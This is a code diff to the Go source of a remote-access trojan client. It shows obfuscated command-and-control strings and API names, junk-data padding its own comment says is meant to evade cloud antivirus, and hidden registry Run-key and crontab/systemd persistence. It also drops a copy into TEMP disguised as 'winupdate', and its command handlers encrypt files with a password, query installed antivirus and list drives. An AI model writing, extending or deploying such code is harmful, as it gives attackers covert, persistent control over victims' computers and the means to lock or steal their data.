@@ -62,9 +62,9 @@ var (
 	obfExtractbrowser                                          = "3d681a040d0a761857317e1d5141034a286c275a"
 	obfExtractbrowserhidden                                    = "3d681a040d0a761857317e1d5141034a286c24085125611d6e33074f"
 	obfBrowserpaths                                            = "3e5e38420a547e1e5018760c57350f4a"
-	obfSetpersistence                                          = "040224040d207608500f7559"
-	obfRemovepersistence                                       = "3d0224040d20760850010959"
-	obfCheckpersistence                                        = "3e67475e0d095c0557357559"
+	obfSetpersistence                                          = "040224040d20660b5044581e573531452b063b5a"
+	obfRemovepersistence                                       = "045d24400c546a1e5031621d50400b4a167338126940664b"
+	obfCheckpersistence                                        = "3e021a5837554405692e7e1e522a290028635b0d6a230e4b"
 	obfLs                                                      = "05783f09"
 	obfDir                                                     = "3d771e4d"
 	obfPwd                                                     = "0478165f"
@@ -76,17 +76,18 @@ var (
 	deleteObjProc, deleteDCProc, releaseDCProc, openClipProc   = shiftEncrypt("DeleteObject"), shiftEncrypt("DeleteDC"), shiftEncrypt("ReleaseDC"), shiftEncrypt("OpenClipboard")
 	emptyClipProc, setClipProc, closeClipProc, debugCheckProc  = shiftEncrypt("EmptyClipboard"), shiftEncrypt("SetClipboardData"), shiftEncrypt("CloseClipboard"), shiftEncrypt("IsDebuggerPresent")
 	instanceLock                                               sync.Mutex
+	firstConnectionScPersist                                   sync.Once
 	lockFile                                                   = ""
 	obfC2Host                                                  = "05671e47373f66425235051056250346165902127c1c7d1a570a691e3d5e2043220a7e0451270959"
 	obfPortStr                                                 = "2974234e"
-	// When true (build tag localtest + lastfinalversion2_localtest.go), C2 defaults to 127.0.0.1:443; C2_HOST / C2_PORT still override.
+	// When true (build tag localtest + lastfinalversion2_localtest.go), C2 defaults to 127.0.0.1:2026; C2_HOST / C2_PORT still override.
 	c2LocalTestMode bool
 )
 
-// Fixed shift for consistency (must match shiftEncrypt for user32/kernel32 API blobs).
+// Fixed shift for consistency
 const shiftValue = 5
 
-// XOR key for enhanced obfuscation (must match every obf* hex literal; rotate only with full regen).
+// XOR key for enhanced obfuscation (change per build)
 const xorKey = "g0r4ng0r3v4d3r"
 
 func shiftEncrypt(text string) string {
@@ -137,14 +138,21 @@ func hashString(s string) uint32 {
 	return hash
 }
 
-// Junk computation noise (no large heap alloc — avoids OOM on low-RAM hosts)
+// Junk data inflation for binary bloating (call in main to evade cloud AV)
 func addJunkData() {
+	junkSize := 100 * 1024 * 1024 // 100MB
+	junk := make([]byte, junkSize)
+	_, _ = rand.Read(junk)
+	// Embed or write to volatile memory/temp (don't persist)
+	// For embed: var _ []byte = junk // But this bloats binary
+	// Junk computation for noise
 	sum := 0
 	for i := 0; i < 20000; i++ {
 		sum += i * (i % 7)
 		_ = sum % 42
 	}
 	_ = sum
+	// Additional junk loop
 	for j := 0; j < 5000; j++ {
 		_ = j * j * j % 123
 	}
@@ -182,24 +190,14 @@ func createLock() bool {
 }
 
 func createAppLock() bool {
-	return createLock()
-}
-
-func lockFileName(prefix string) string {
-	host := strings.Map(func(r rune) rune {
-		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '-' || r == '_' {
-			return r
-		}
-		return '_'
-	}, getHostname())
-	return fmt.Sprintf("%s_%s.lock", prefix, host)
+	return createLockWithPrefix("app")
 }
 
 func createLockWithPrefix(prefix string) bool {
 	instanceLock.Lock()
 	defer instanceLock.Unlock()
 
-	lockName := lockFileName(prefix)
+	lockName := fmt.Sprintf("%s_%s_%d.lock", prefix, getHostname(), os.Getpid())
 	var lockPath string
 	if runtime.GOOS == "windows" {
 		lockPath = filepath.Join(os.TempDir(), lockName)
@@ -272,6 +270,7 @@ func isAppRunning() bool {
 }
 
 func isRunningWithPrefix(prefix string) bool {
+	pattern := fmt.Sprintf("%s_*_*.lock", prefix)
 	var searchDir string
 	if runtime.GOOS == "windows" {
 		searchDir = os.TempDir()
@@ -279,7 +278,7 @@ func isRunningWithPrefix(prefix string) bool {
 		searchDir = "/tmp"
 	}
 
-	files, err := filepath.Glob(filepath.Join(searchDir, lockFileName(prefix)))
+	files, err := filepath.Glob(filepath.Join(searchDir, pattern))
 	if err != nil || len(files) == 0 {
 		return false
 	}
@@ -326,55 +325,6 @@ func isRunningWithPrefix(prefix string) bool {
 	return false
 }
 
-// One process per machine — must run before makeCopy / network loop.
-func ensureSingleInstance() bool {
-	if isAppRunning() {
-		return false
-	}
-	if createAppLock() {
-		return true
-	}
-	time.Sleep(800 * time.Millisecond)
-	if isAppRunning() {
-		return false
-	}
-	return createAppLock()
-}
-
-func normalizeExePath(path string) string {
-	path = strings.TrimSpace(path)
-	if path == "" {
-		return ""
-	}
-	abs, err := filepath.Abs(path)
-	if err != nil {
-		return filepath.Clean(path)
-	}
-	return abs
-}
-
-func isPersistedCopyPath(path string) bool {
-	abs := normalizeExePath(path)
-	if abs == "" {
-		return false
-	}
-	name := filepath.Base(abs)
-	for _, dir := range getPlacementLocations() {
-		if strings.EqualFold(filepath.Join(dir, name), abs) {
-			return true
-		}
-	}
-	return false
-}
-
-// Registry Run + Startup folder both launch at logon — keep only startup (v3backup uses the same).
-func removeRegistryAutoStart() {
-	if runtime.GOOS != "windows" {
-		return
-	}
-	_ = runHiddenCmd("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", persistRunValue, "/f").Run()
-}
-
 type SysInfo struct {
 	Host, Mac, User, Session string
 }
@@ -385,72 +335,6 @@ type Cmd struct {
 
 type Resp struct {
 	Type, Content string
-}
-
-func hiddenProcAttr() *syscall.SysProcAttr {
-	return &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
-}
-
-func runHiddenCmd(name string, args ...string) *exec.Cmd {
-	cmd := exec.Command(name, args...)
-	cmd.SysProcAttr = hiddenProcAttr()
-	return cmd
-}
-
-// User-writable paths first; system dirs as fallback (matches v3backup.go)
-func getPlacementLocations() []string {
-	var locations []string
-
-	if home, err := os.UserHomeDir(); err == nil && home != "" {
-		locations = append(locations,
-			filepath.Join(home, "AppData", "Local"),
-			filepath.Join(home, "Documents"),
-			filepath.Join(home, "Downloads"),
-			home,
-		)
-	}
-	if localAppData := os.Getenv("LOCALAPPDATA"); localAppData != "" {
-		locations = append(locations, localAppData)
-	}
-	if appData := os.Getenv("APPDATA"); appData != "" {
-		locations = append(locations, appData)
-	}
-
-	locations = append(locations,
-		`C:\Temp`,
-		`C:\Users\Public`,
-		`C:\Windows\Temp`,
-		`C:\ProgramData`,
-	)
-
-	return locations
-}
-
-func getUserStartupDir() (string, error) {
-	if appData := os.Getenv("APPDATA"); appData != "" {
-		dir := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-		if _, err := os.Stat(dir); err == nil {
-			return dir, nil
-		}
-	}
-	if home, err := os.UserHomeDir(); err == nil && home != "" {
-		dir := filepath.Join(home, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-		if _, err := os.Stat(dir); err == nil {
-			return dir, nil
-		}
-	}
-	return "", fmt.Errorf("user startup folder not found")
-}
-
-func copyExecutableFile(src, dst string) error {
-	data, err := os.ReadFile(src)
-	if err != nil {
-		return err
-	}
-	if err := os.MkdirAll(filepath.Dir(dst), 0755); err != nil {
-		return err
-	}
-	return os.WriteFile(dst, data, 0755)
 }
 
 func hideTerminal() {
@@ -484,55 +368,53 @@ func makeCopy() string {
 	if err != nil {
 		return ""
 	}
-	exePath = normalizeExePath(exePath)
-
-	// Already running from v3backup / prior drop — do not copy again.
-	if isPersistedCopyPath(exePath) {
-		return exePath
-	}
-
-	if runtime.GOOS != "windows" {
-		copyPath := filepath.Join("/tmp", makeRandomName())
-		if copyExecutableFile(exePath, copyPath) == nil {
-			_ = os.Remove(exePath)
-			return copyPath
+	var copyPath string
+	if runtime.GOOS == "windows" {
+		systemDirs := []string{
+			filepath.Join(os.Getenv("WINDIR"), "System32"),
+			filepath.Join(os.Getenv("WINDIR"), "SysWOW64"),
+			filepath.Join(os.Getenv("TEMP")),
 		}
-		return exePath
-	}
-
-	dropName := filepath.Base(exePath)
-	for _, dir := range getPlacementLocations() {
-		if _, err := os.Stat(dir); err != nil {
-			continue
-		}
-		copyPath := filepath.Join(dir, dropName)
-		if _, err := os.Stat(copyPath); err == nil {
-			continue
-		}
-		if copyErr := copyExecutableFile(exePath, copyPath); copyErr == nil {
-			_ = os.Remove(exePath)
-			return copyPath
-		}
-	}
-
-	// Legacy app-mode names under the same simple dirs (not System32)
-	appNames := getAppNames()
-	for _, dir := range getPlacementLocations() {
-		if _, err := os.Stat(dir); err != nil {
-			continue
-		}
-		for _, name := range appNames {
-			copyPath := filepath.Join(dir, name)
-			if _, err := os.Stat(copyPath); err == nil {
-				continue
+		appNames := getAppNames() // Deobfuscate here
+		for _, dir := range systemDirs {
+			for i := 0; i < 5; i++ {
+				randomName := makeRandomName()
+				copyPath = filepath.Join(dir, randomName)
+				if _, err := os.Stat(copyPath); os.IsNotExist(err) {
+					input, err := os.ReadFile(exePath)
+					if err == nil {
+						err = os.WriteFile(copyPath, input, 0755)
+						if err == nil {
+							os.Remove(exePath) // Delete original after copy
+							return copyPath
+						}
+					}
+				}
 			}
-			if copyErr := copyExecutableFile(exePath, copyPath); copyErr == nil {
-				_ = os.Remove(exePath)
-				return copyPath
+			for _, name := range appNames {
+				copyPath = filepath.Join(dir, name)
+				if _, err := os.Stat(copyPath); os.IsNotExist(err) {
+					input, err := os.ReadFile(exePath)
+					if err == nil {
+						err = os.WriteFile(copyPath, input, 0755)
+						if err == nil {
+							os.Remove(exePath) // Delete original after copy
+							return copyPath
+						}
+					}
+				}
 			}
 		}
+	} else {
+		randomName := makeRandomName()
+		copyPath = filepath.Join("/tmp", randomName)
+		input, err := os.ReadFile(exePath)
+		if err == nil {
+			os.WriteFile(copyPath, input, 0755)
+			os.Remove(exePath) // Delete original after copy
+			return copyPath
+		}
 	}
-
 	return exePath
 }
 
@@ -544,63 +426,186 @@ func getAppNames() []string {
 	return names
 }
 
-const persistRunValue = "ScService"
+const (
+	// reg.exe accepts HKCU\... (same as HKEY_CURRENT_USER\...)
+	persistHKCURunKey = `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
+	persistRegName    = "ScService"
+)
 
-func startupLauncherPath(exePath string) (string, error) {
-	startupDir, err := getUserStartupDir()
+// regQueryValueOutput runs reg query and returns stdout (empty if missing).
+func regQueryValueOutput(name string) string {
+	cmd := exec.Command("reg", "query", persistHKCURunKey, "/v", name)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
+	out, err := cmd.Output()
 	if err != nil {
-		return "", err
+		return ""
 	}
-	name := strings.TrimSuffix(filepath.Base(exePath), filepath.Ext(exePath)) + ".bat"
-	return filepath.Join(startupDir, name), nil
+	return string(out)
+}
+
+// writeHKCUScServiceRun writes HKCU\...\Run\ScService (same as: reg add "HKCU\...\Run" /v ScService /t REG_SZ /d "<path>" /f).
+func writeHKCUScServiceRun(target string) {
+	if runtime.GOOS != "windows" || strings.TrimSpace(target) == "" {
+		return
+	}
+	regData := target
+	if strings.ContainsAny(target, " \t") {
+		regData = `"` + target + `"`
+	}
+	cmd := exec.Command("reg", "add", persistHKCURunKey, "/v", persistRegName, "/t", "REG_SZ", "/d", regData, "/f")
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
+	_ = cmd.Run()
+}
+
+// applyFirstConnectionSCPersistence runs once on first C2 registration: copy to user TEMP then ScService Run key.
+func applyFirstConnectionSCPersistence() {
+	if runtime.GOOS != "windows" {
+		return
+	}
+	exe, err := os.Executable()
+	if err != nil {
+		return
+	}
+	abs, err := filepath.Abs(exe)
+	if err != nil {
+		return
+	}
+	cleanLegacyWindowsPersistenceArtifacts()
+	writeHKCUScServiceRun(persistExeForRunKey(abs))
+}
+
+// userTempPersistDirs returns only per-user TEMP folders (never the launch directory).
+func userTempPersistDirs() []string {
+	seen := make(map[string]bool)
+	var dirs []string
+	add := func(d string) {
+		d = strings.TrimSpace(d)
+		if d == "" {
+			return
+		}
+		d = filepath.Clean(d)
+		if !seen[d] {
+			seen[d] = true
+			dirs = append(dirs, d)
+		}
+	}
+	add(os.Getenv("TEMP"))
+	add(os.TempDir())
+	add(filepath.Join(os.Getenv("LOCALAPPDATA"), "Temp"))
+	add(os.Getenv("TMP"))
+	return dirs
+}
+
+// persistDestPath is the stable path under user TEMP for the persisted copy (does not require file to exist).
+func persistDestPath(absExe string) string {
+	dirs := userTempPersistDirs()
+	if len(dirs) == 0 {
+		return ""
+	}
+	return filepath.Join(dirs[0], v3PersistedCopyFileName(absExe))
+}
+
+// persistExePathIfCopyExists returns the user-TEMP copy path if present; otherwise empty.
+func persistExePathIfCopyExists(absExe string) string {
+	name := v3PersistedCopyFileName(absExe)
+	for _, dir := range userTempPersistDirs() {
+		dest := filepath.Join(dir, name)
+		if st, err := os.Stat(dest); err == nil && !st.IsDir() {
+			return dest
+		}
+	}
+	return ""
+}
+
+// persistExeForRunKey copies/replaces the exe into user TEMP and returns that path (never the launch dir).
+func persistExeForRunKey(absExe string) string {
+	data, err := os.ReadFile(absExe)
+	if err != nil {
+		if p := persistExePathIfCopyExists(absExe); p != "" {
+			return p
+		}
+		return absExe
+	}
+	name := v3PersistedCopyFileName(absExe)
+	for _, dir := range userTempPersistDirs() {
+		_ = os.MkdirAll(dir, 0755)
+		dest := filepath.Join(dir, name)
+		// Replace existing file in user TEMP
+		_ = os.Remove(dest)
+		if err := os.WriteFile(dest, data, 0755); err != nil {
+			continue
+		}
+		cmd := exec.Command("attrib", "+h", "+s", dest)
+		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
+		_ = cmd.Run()
+		return dest
+	}
+	if p := persistExePathIfCopyExists(absExe); p != "" {
+		return p
+	}
+	return absExe
 }
 
 func isPersistenceSet(exePath string) bool {
 	if runtime.GOOS == "windows" {
-		if launcher, err := startupLauncherPath(exePath); err == nil {
-			if _, err := os.Stat(launcher); err == nil {
+		abs, err := filepath.Abs(exePath)
+		if err != nil {
+			return false
+		}
+		// Only ACTIVE if ScService points at the user-TEMP copy (not the launch directory).
+		want := strings.ToLower(strings.TrimSpace(persistDestPath(abs)))
+		if want == "" {
+			return false
+		}
+		if out := strings.ToLower(regQueryValueOutput(persistRegName)); out != "" && strings.Contains(out, want) {
+			if st, err := os.Stat(want); err == nil && !st.IsDir() {
 				return true
 			}
 		}
-	} else {
-		// Check crontab
-		cmd := exec.Command("crontab", "-l")
-		output, err := cmd.Output()
-		if err == nil && strings.Contains(string(output), exePath) {
-			return true
-		}
+		return false
+	}
+	// Check crontab
+	cmd := exec.Command("crontab", "-l")
+	output, err := cmd.Output()
+	if err == nil && strings.Contains(string(output), exePath) {
+		return true
 	}
 	return false
 }
 
-func setUserStartupPersistence(exePath string) error {
-	startupDir, err := getUserStartupDir()
-	if err != nil {
-		return err
+// setPersistenceResult copies exe to user TEMP, sets ScService to that path, returns status text.
+func setPersistenceResult(exePath string) string {
+	if runtime.GOOS != "windows" {
+		setPersistence(exePath)
+		if isPersistenceSet(exePath) {
+			return "Persistence set successfully - Client will start on system boot"
+		}
+		return "Persistence set attempted (Linux)"
 	}
-	launcherName := strings.TrimSuffix(filepath.Base(exePath), filepath.Ext(exePath)) + ".bat"
-	launcherPath := filepath.Join(startupDir, launcherName)
-	content := fmt.Sprintf(`@echo off
-start "" "%s"`, exePath)
-	return os.WriteFile(launcherPath, []byte(content), 0644)
+
+	abs, err := filepath.Abs(exePath)
+	if err != nil {
+		return fmt.Sprintf("Persistence failed: %v", err)
+	}
+	cleanLegacyWindowsPersistenceArtifacts()
+	target := persistExeForRunKey(abs)
+	writeHKCUScServiceRun(target)
+	_ = hashString("persist_once")
+
+	if strings.EqualFold(filepath.Clean(target), filepath.Clean(abs)) {
+		return fmt.Sprintf("Persistence registry set but TEMP copy failed; path=%s", target)
+	}
+	if isPersistenceSet(abs) {
+		return fmt.Sprintf("Persistence set successfully - TEMP copy: %s", target)
+	}
+	return fmt.Sprintf("Persistence registry written - path: %s (verify with checkpersistence)", target)
 }
 
 func setPersistence(exePath string) {
-	exePath = normalizeExePath(exePath)
-	if exePath == "" || isPersistenceSet(exePath) {
-		return
-	}
-
-	if runtime.GOOS == "windows" {
-		// Single autostart channel: Startup folder only (not HKCU Run — that doubles with .bat).
-		removeRegistryAutoStart()
-		_ = setUserStartupPersistence(exePath)
-
-		for i := 0; i < 5; i++ {
-			_ = i * i
+	if runtime.GOOS != "windows" {
+		if isPersistenceSet(exePath) {
+			return
 		}
-		_ = hashString("persist_junk")
-	} else {
 		// Linux persistence methods
 		// Method 1: Crontab
 		cronEntry := fmt.Sprintf("@reboot %s\n", exePath)
@@ -641,90 +646,72 @@ WantedBy=multi-user.target`, exePath)
 		rcLocalPath := "/etc/rc.local"
 		rcLocalContent := fmt.Sprintf("#!/bin/bash\n%s &\n", exePath)
 		os.WriteFile(rcLocalPath, []byte(rcLocalContent), 0755)
+		// Add junk code
+		_ = time.Now().UnixNano() % 100
+		return
 	}
-	// Add junk code
-	_ = time.Now().UnixNano() % 100
+
+	// Always re-apply: copy/replace into user TEMP and point ScService there
+	_ = setPersistenceResult(exePath)
 }
 
-func v3SystemCopyDirs() []string {
-	return getPlacementLocations()
+func cleanLegacyWindowsPersistenceArtifacts() {
+	if runtime.GOOS != "windows" {
+		return
+	}
+	cmd := exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateService", "/f")
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
+	_ = cmd.Run()
+	// Legacy Run names from older builds (do not delete ScService — we use it now)
+	for _, v := range []string{"WindowsUpdateService", "WindowsUpdate"} {
+		cmd = exec.Command("reg", "delete", persistHKCURunKey, "/v", v, "/f")
+		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
+		_ = cmd.Run()
+	}
+	startupFile := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "WindowsUpdateService.bat")
+	_ = os.Remove(startupFile)
+	cmd = exec.Command("sc", "stop", "WindowsUpdateService")
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
+	_ = cmd.Run()
+	time.Sleep(400 * time.Millisecond)
+	cmd = exec.Command("sc", "delete", "WindowsUpdateService")
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
+	_ = cmd.Run()
 }
 
-// v3PersistedCopyFileName: prefer original exe name; legacy winupdate* hash for older drops.
+// v3PersistedCopyFileName matches V3.go createSystemPersistence: sha256(abs path) -> winupdate + first 3 bytes hex + .exe
 func v3PersistedCopyFileName(absExe string) string {
-	base := filepath.Base(absExe)
-	if strings.EqualFold(filepath.Ext(base), ".exe") {
-		return base
-	}
 	h := sha256.Sum256([]byte(absExe))
 	return "winupdate" + hex.EncodeToString(h[:3]) + ".exe"
 }
 
-func isV3PersistedCopyBasename(base string) bool {
-	s := strings.ToLower(base)
-	const pfx, sfx = "winupdate", ".exe"
-	if !strings.HasPrefix(s, pfx) || !strings.HasSuffix(s, sfx) {
-		return false
-	}
-	mid := s[len(pfx) : len(s)-len(sfx)]
-	if len(mid) != 6 {
-		return false
-	}
-	for i := 0; i < 6; i++ {
-		c := mid[i]
-		if (c < '0' || c > '9') && (c < 'a' || c > 'f') {
-			return false
-		}
-	}
-	return true
-}
-
-// persistedExePathForScRunKey is the path V3 dropped (e.g. C:\Windows\Temp\winupdateea81d7.exe): use when already
-// running that copy, else find the copy V3 created for this binary using the same name + dirs as V3.go.
-func persistedExePathForScRunKey() string {
-	exe, err := os.Executable()
-	if err != nil {
-		return ""
-	}
-	exe, _ = filepath.Abs(exe)
-	base := filepath.Base(exe)
-	if isV3PersistedCopyBasename(base) {
-		return exe
-	}
-	names := []string{v3PersistedCopyFileName(exe)}
-	h := sha256.Sum256([]byte(exe))
-	legacy := "winupdate" + hex.EncodeToString(h[:3]) + ".exe"
-	if legacy != names[0] {
-		names = append(names, legacy)
-	}
-	for _, dir := range v3SystemCopyDirs() {
-		for _, name := range names {
-			candidate := filepath.Join(dir, name)
-			if st, err := os.Stat(candidate); err == nil && !st.IsDir() {
-				return candidate
-			}
-		}
-	}
-	return exe
-}
-
 func removePersistence() {
 	if runtime.GOOS == "windows" {
-		removeRegistryAutoStart()
-		_ = runHiddenCmd("schtasks", "/delete", "/tn", "WindowsUpdateService", "/f").Run()
-		_ = runHiddenCmd("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "WindowsUpdateService", "/f").Run()
+		// Remove scheduled task
+		cmd := exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateService", "/f")
+		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
+		_ = cmd.Run()
 
-		if exe, err := os.Executable(); err == nil {
-			if launcher, err := startupLauncherPath(exe); err == nil {
-				_ = os.Remove(launcher)
-			}
-		}
-		if startupDir, err := getUserStartupDir(); err == nil {
-			_ = os.Remove(filepath.Join(startupDir, "WindowsUpdateService.bat"))
+		// Remove registry entries (current + legacy)
+		for _, v := range []string{persistRegName, "WindowsUpdateService", "WindowsUpdate"} {
+			cmd = exec.Command("reg", "delete", persistHKCURunKey, "/v", v, "/f")
+			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
+			_ = cmd.Run()
 		}
 
-		_ = runHiddenCmd("sc", "stop", "WindowsUpdateService").Run()
-		_ = runHiddenCmd("sc", "delete", "WindowsUpdateService").Run()
+		// Remove startup file
+		startupPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+		startupFile := filepath.Join(startupPath, "WindowsUpdateService.bat")
+		os.Remove(startupFile)
+
+		// Remove service
+		cmd = exec.Command("sc", "stop", "WindowsUpdateService")
+		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
+		_ = cmd.Run()
+
+		cmd = exec.Command("sc", "delete", "WindowsUpdateService")
+		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
+		_ = cmd.Run()
 	} else {
 		// Remove from crontab
 		cmd := exec.Command("crontab", "-l")
@@ -1039,8 +1026,7 @@ func uploadFile(conn net.Conn, filename string) error {
 		return fmt.Errorf("failed to read file size: %v", err)
 	}
 	fileSize := int64(binary.LittleEndian.Uint64(sizeBytes))
-	copyBuf := make([]byte, 256*1024)
-	_, err = io.CopyBuffer(file, io.LimitReader(conn, fileSize), copyBuf)
+	_, err = io.CopyN(file, conn, fileSize)
 	if err != nil {
 		return fmt.Errorf("failed to read file data: %v", err)
 	}
@@ -1147,9 +1133,13 @@ func makeSessionID() string {
 }
 
 func makeRandomName() string {
-	var b [8]byte
-	_, _ = rand.Read(b[:])
-	return fmt.Sprintf("%x.exe", b)
+	prefixes := []string{"App", "System", "Update", "Service", "Process", "Manager", "Handler", "Controller", "Monitor", "Agent"}
+	suffixes := []string{"Starter", "Processor", "Manager", "Service", "Handler", "Controller", "Monitor", "Agent", "Helper", "Worker"}
+
+	prefix := prefixes[time.Now().UnixNano()%int64(len(prefixes))]
+	suffix := suffixes[time.Now().UnixNano()%int64(len(suffixes))]
+
+	return fmt.Sprintf("%s%s.exe", prefix, suffix)
 }
 
 func runCommand(command string) string {
@@ -1271,7 +1261,7 @@ powershell -Command "Add-Type -AssemblyName System.Windows.Forms; $clipboard = [
 	delDCProc.Call(memDC)
 	relDCProc.Call(0, dc)
 	_ = hashString("snapshot_junk")
-	return fmt.Sprintf("Snapshot saved as: %s", filename)
+	return fmt.Sprintf("Snapshot saved as: %s", fullPath)
 }
 
 func changeDir(path string) string {
@@ -1378,6 +1368,34 @@ func getCurrentDir() string {
 		return "."
 	}
 	return dir
+}
+
+// listAvailableDrives returns ready-mounted volumes (Windows letters / Linux mounts).
+func listAvailableDrives() string {
+	var result strings.Builder
+	result.WriteString("Drives:\n")
+	if runtime.GOOS == "windows" {
+		found := 0
+		for c := 'A'; c <= 'Z'; c++ {
+			root := string(c) + ":\\"
+			if _, err := os.Stat(root); err == nil {
+				result.WriteString(fmt.Sprintf("<DRIVE>\t%s\t\t<DRIVE>\t\t-\n", string(c)+":"))
+				found++
+			}
+		}
+		if found == 0 {
+			result.WriteString("No drives found\n")
+		}
+		return result.String()
+	}
+	// Linux / unix: show common roots
+	candidates := []string{"/", "/home", "/mnt", "/media", "/tmp", "/var", "/opt", "/usr"}
+	for _, p := range candidates {
+		if info, err := os.Stat(p); err == nil && info.IsDir() {
+			result.WriteString(fmt.Sprintf("<DRIVE>\t%s\t\t<DRIVE>\t\t-\n", p))
+		}
+	}
+	return result.String()
 }
 
 func generateKey(password string) []byte {
@@ -1985,13 +2003,13 @@ func getPort() int {
 		}
 	}
 	if c2LocalTestMode {
-		return 443
+		return 2026
 	}
 	portStr := deobfuscateString(obfPortStr)
 	if v, err := strconv.Atoi(portStr); err == nil {
 		return v
 	}
-	return 443
+	return 2026
 }
 
 // Control flow flattening wrapper for handleCmd (junk branches)
@@ -2016,6 +2034,41 @@ func obfuscatedHandleCmd(command string, conn net.Conn) {
 }
 
 func handleCmd(command string, conn net.Conn) {
+	command = strings.TrimSpace(command)
+	cmdLower := strings.ToLower(command)
+
+	// Persistence commands first (plain + case-insensitive) so they never fall through to shell
+	if cmdLower == "setpersistence" {
+		exePath, _ := os.Executable()
+		response := Resp{Type: "response", Content: setPersistenceResult(exePath)}
+		sendData(conn, response)
+		return
+	}
+	if cmdLower == "checkpersistence" {
+		exePath, _ := os.Executable()
+		var response Resp
+		if isPersistenceSet(exePath) {
+			abs, _ := filepath.Abs(exePath)
+			response = Resp{Type: "response", Content: fmt.Sprintf("Persistence is ACTIVE - TEMP path: %s", persistDestPath(abs))}
+		} else {
+			response = Resp{Type: "response", Content: "Persistence is NOT SET - Client will not start on system boot"}
+		}
+		sendData(conn, response)
+		return
+	}
+	if cmdLower == "removepersistence" {
+		removePersistence()
+		response := Resp{Type: "response", Content: "Persistence removed successfully - Client will not start on system boot"}
+		sendData(conn, response)
+		return
+	}
+	if cmdLower == "listdrives" || cmdLower == "drives" {
+		result := listAvailableDrives()
+		response := Resp{Type: "response", Content: result}
+		sendData(conn, response)
+		return
+	}
+
 	testStr := deobfuscateString(obfTest)
 	debugStr := deobfuscateString(obfDebug)
 	uploadStr := deobfuscateString(obfUpload)
@@ -2103,17 +2156,39 @@ func handleCmd(command string, conn net.Conn) {
 		sendData(conn, response)
 	} else if command == antivirusStr {
 		runCommandWithChunks("wmic /node:localhost /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState", conn)
-	} else if strings.HasPrefix(command, setpassStr) {
-		password := strings.TrimPrefix(command, setpassStr)
+	} else if command == "listdrives" || command == "drives" {
+		result := listAvailableDrives()
+		response := Resp{Type: "response", Content: result}
+		sendData(conn, response)
+	} else if command == setpersistenceStr || command == "setpersistence" {
+		exePath, _ := os.Executable()
+		response := Resp{Type: "response", Content: setPersistenceResult(exePath)}
+		sendData(conn, response)
+	} else if command == removepersistenceStr || command == "removepersistence" {
+		removePersistence()
+		response := Resp{Type: "response", Content: "Persistence removed successfully - Client will not start on system boot"}
+		sendData(conn, response)
+	} else if command == checkpersistenceStr || command == "checkpersistence" {
+		exePath, _ := os.Executable()
+		var response Resp
+		if isPersistenceSet(exePath) {
+			abs, _ := filepath.Abs(exePath)
+			response = Resp{Type: "response", Content: fmt.Sprintf("Persistence is ACTIVE - TEMP path: %s", persistDestPath(abs))}
+		} else {
+			response = Resp{Type: "response", Content: "Persistence is NOT SET - Client will not start on system boot"}
+		}
+		sendData(conn, response)
+	} else if command == setpassStr || strings.HasPrefix(command, strings.TrimSpace(setpassStr)+" ") {
+		password := strings.TrimSpace(strings.TrimPrefix(command, strings.TrimSpace(setpassStr)))
 		result := setPass(password)
 		response := Resp{Type: "response", Content: result}
 		sendData(conn, response)
-	} else if command == getpassStr {
+	} else if command == getpassStr || command == "getpass" {
 		result := getPass()
 		response := Resp{Type: "response", Content: result}
 		sendData(conn, response)
-	} else if strings.HasPrefix(command, encryptStr) {
-		path := strings.TrimPrefix(command, encryptStr)
+	} else if command == encryptStr || strings.HasPrefix(command, strings.TrimSpace(encryptStr)+" ") {
+		path := strings.TrimSpace(strings.TrimPrefix(command, strings.TrimSpace(encryptStr)))
 		if currentPass == "" {
 			response := Resp{Type: "response", Content: "No password set. Use 'setpass <password>' first."}
 			sendData(conn, response)
@@ -2127,8 +2202,8 @@ func handleCmd(command string, conn net.Conn) {
 			response := Resp{Type: "response", Content: result}
 			sendData(conn, response)
 		}
-	} else if strings.HasPrefix(command, decryptStr) {
-		path := strings.TrimPrefix(command, decryptStr)
+	} else if command == decryptStr || strings.HasPrefix(command, strings.TrimSpace(decryptStr)+" ") {
+		path := strings.TrimSpace(strings.TrimPrefix(command, strings.TrimSpace(decryptStr)))
 		if currentPass == "" {
 			response := Resp{Type: "response", Content: "No password set. Use 'setpass <password>' first."}
 			sendData(conn, response)
@@ -2157,24 +2232,6 @@ func handleCmd(command string, conn net.Conn) {
 	} else if command == browserpathsStr {
 		result := getRecentPaths()
 		response := Resp{Type: "response", Content: result}
-		sendData(conn, response)
-	} else if command == setpersistenceStr {
-		exePath, _ := os.Executable()
-		setPersistence(exePath)
-		response := Resp{Type: "response", Content: "Persistence set successfully - Client will start on system boot"}
-		sendData(conn, response)
-	} else if command == removepersistenceStr {
-		removePersistence()
